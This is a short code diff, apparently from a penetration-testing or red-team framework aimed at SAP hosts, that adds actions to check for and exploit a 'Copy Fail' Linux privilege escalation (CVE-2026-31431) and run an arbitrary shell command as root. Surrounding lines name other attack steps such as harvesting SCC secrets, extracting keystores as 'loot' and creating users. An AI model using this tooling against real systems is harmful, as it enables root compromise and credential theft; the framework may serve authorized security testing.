@@ -402,6 +402,19 @@ def _map_step(step: dict) -> tuple:
         #   target: SAP node SID (node co-located with SCC)
         return ("POST", f"/api/node/{target}/harvest_scc_ssfs", {}, True)
 
+    if action == "check_copyfail":
+        # Check if the host is vulnerable to CVE-2026-31431 (Copy Fail LPE).
+        #   target: SAP node SID (must have OS-exec path, Linux only)
+        return ("POST", f"/api/node/{target}/check_copyfail", {}, True)
+
+    if action == "exploit_copyfail":
+        # Execute a shell command as root via CVE-2026-31431 Copy Fail LPE.
+        #   target:  SAP node SID
+        #   command: shell command to run as root (default: "id")
+        return ("POST", f"/api/node/{target}/exploit_copyfail", {
+            "command": step.get("command", "id"),
+        }, True)
+
     raise ValueError(f"Unknown action: {action}")
 
 
@@ -415,6 +428,7 @@ DESTRUCTIVE_ACTIONS = {
     "create_user_java",
     "scc_extract_keystore",   # pulls full backup + writes crown-jewels loot
     "harvest_scc",            # writes files to /tmp on target host
+    "exploit_copyfail",       # patches /usr/bin/su page cache to exec as root
 }
 
 
